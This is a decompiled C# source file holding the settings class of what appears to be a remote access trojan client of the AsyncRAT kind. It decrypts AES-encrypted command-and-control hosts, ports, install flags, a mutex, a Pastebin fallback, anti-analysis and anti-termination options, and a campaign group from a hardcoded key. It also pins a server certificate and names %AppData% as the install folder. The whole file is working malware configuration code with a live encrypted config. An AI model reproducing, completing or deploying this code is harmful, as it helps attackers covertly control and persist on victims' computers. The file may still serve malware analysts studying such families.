using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client
{
	// Token: 0x02000003 RID: 3
	public static class Settings
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000026F8 File Offset: 0x000008F8
		public static bool InitializeSettings()
		{
			bool result;
			try
			{
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
				Settings.aes256 = new Aes256(Settings.Key);
				Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
				Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
				Settings.Version = Settings.aes256.Decrypt(Settings.Version);
				Settings.Install = Settings.aes256.Decrypt(Settings.Install);
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
				Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
				Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
				Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
				Settings.Group = Settings.aes256.Decrypt(Settings.Group);
				Settings.Hwid = HwidGen.HWID();
				Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
				Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
				result = Settings.VerifyHash();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002850 File Offset: 0x00000A50
		private static bool VerifyHash()
		{
			bool result;
			try
			{
				result = ((RSACryptoServiceProvider)Settings.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Serversignature));
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		public static string Ports = "KzAJLSaY5fanW8LVAMMHyFnTxFjW1Qy97urwJ936mM1/+s3nEqXjQczBAGhbztvajj/EqGRcyHqZ+hZ1liJ60A==";

		// Token: 0x04000002 RID: 2
		public static string Hosts = "Iv3d+QmgEbol0J10wYQmJiHJCGjeSPnKithZ1rjSbnlSSpA55lHSP6GYmUN5JR7RYemEsJFq7SyIe2E4QrdZng==";

		// Token: 0x04000003 RID: 3
		public static string Version = "XnGoNqdTrdgxr3d4hJ4fLrGWvNmAtn6svZyjcJpxw3CSidg1I76OayAN/hQnj6BynuClA4QYyQyOC2Iximubgw==";

		// Token: 0x04000004 RID: 4
		public static string Install = "NiEDcY/wdp3vheTcOR3cwe4O8UsKcmPuhMrZrV8IFQWEQ86Ak804AldXtf6gsO/mAOA7ocN+OTsO3p7QyZa8xQ==";

		// Token: 0x04000005 RID: 5
		public static string InstallFolder = "%AppData%";

		// Token: 0x04000006 RID: 6
		public static string InstallFile = "";

		// Token: 0x04000007 RID: 7
		public static string Key = "Q1dtUExqV2JNVVRscUZabFdYUjNOcmY5cmZIdjN0RXU=";

		// Token: 0x04000008 RID: 8
		public static string MTX = "ANSpWDc1ZTcLZC/KyKe61P6EzvCj8xDPhD6yj3lIkyOmrmQLLYgmJNk3yjHjS31a736N99kXIxgWCu12I5q8vQ==";

		// Token: 0x04000009 RID: 9
		public static string Certificate = "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";

		// Token: 0x0400000A RID: 10
		public static string Serversignature = "rIk+Y6uqb9kR1qQD/1XPQcp3GxUtrdMHGaMtHpPXM7mwD1aVe8Czru0QWWihId6lluQvN9I14kUA2rkC6iLieJKnXyGoMo+AfopL7kMal5vPgfSy2hV/q425qRlVJxjUGvUGRGZ107+O0AO1D4vWqnqWTCtnK3H8u/qJAvvLuChXhjtJzjq6WbX2+plcuTdosj8HJEHnFT9be/fQK2CVi3ktN3Ppbbk3chL1gv5SJK9EjbpNxpAZfEufCWb6J+t6ZdO5cm4ERGq5fvNxW462L8i57UURGfhY3oa0B2QltizAQ8txtFVlutfPzxC7k2zxOCCBiA+RW03mx1AIZEU+iiavX7wf/M6kPRwnn6Vf4h9s453W1uaDl559sjW0FatIXcw7ijX23Zmm5EWYHOtTGNeAvC60UV4vG8U8F5aY1fiK+OGoqD59yLSTPeMgHd1E7pYbPrM4Fj192H5gEPcrCt4SC89oZFCnw11raE7KV8Qdzko2taIVwddymKmnbwod32QKpRrDpd3Y835i3Wc7SUidz5v3K62F1yz3Z7JYAZT37D4L2MY93bRm/wjsnC2++to4roO5dwF/vYA6M5IWQAdy9B5IG9cR8s1IXmV/h4y/qKzquQ8xv2ApTZLB1oMsja91tjFR3XvHDUmxt5mmaATsvAtDAO/A6D2TA00Gh0t/EZ9AT5lGQL9q9jx0yJabJ38Pm1nP73rZEx5JrrOYhVPdM0XiFhn/PoUNlgrZMtcMGD+TbBS3URJNFZcG/oXkc6MDVzVLVWPrBEzOPNdzo9lbkjII3M7Jtl00XEgOjWqwxXhlsWbigPkgEeLXKjT8C5kRYLG94kVCe/VVSkZNm3mpyuPfKjYbCEK27kH/gXj1bNpZtURxWrZd+8CrtYGMSD4/BGijaCGGjCbpcbLF5529UuIwG5dzQhq+uREQ3UqJBz/ub/Yawk19iFiBzrrfbrKDwuV1Fi+u/CRoOki6MQ==";

		// Token: 0x0400000B RID: 11
		public static X509Certificate2 ServerCertificate;

		// Token: 0x0400000C RID: 12
		public static string Anti = "+SI2kGtizi3CCytJWjmm8J22CxdAkvK1SwR6RxAg31HIbrYZ3WN/eSf2VqcPN6+2bvswt9TO3z5/cz78MBExQw==";

		// Token: 0x0400000D RID: 13
		public static Aes256 aes256;

		// Token: 0x0400000E RID: 14
		public static string Pastebin = "GZiwuy52LkK/8iZ/fa19Ro0ekW84AtqnGi6iePOkxuny0qYG7fOd87pg0ofYxKeviGar54CH/v1AcMEa1+/UyQ==";

		// Token: 0x0400000F RID: 15
		public static string BDOS = "1cTaw/cBRA3mki4QlNjuZzXEWcaetd2iVH1H7XcKrCaC160FsLfZnGPHxn3ea2iPcWxaRGCNgn0VFI1Owi9e/w==";

		// Token: 0x04000010 RID: 16
		public static string Hwid = null;

		// Token: 0x04000011 RID: 17
		public static string Delay = "3";

		// Token: 0x04000012 RID: 18
		public static string Group = "zSKlI9iUYtbpBoM92w4vURdUOEaX9fM5/KB5gSTq4UBOAiYLdmBxfUId5lKqm9OrEw0ZqCrvjOS1oBAHuvLjdQ==";
	}
}
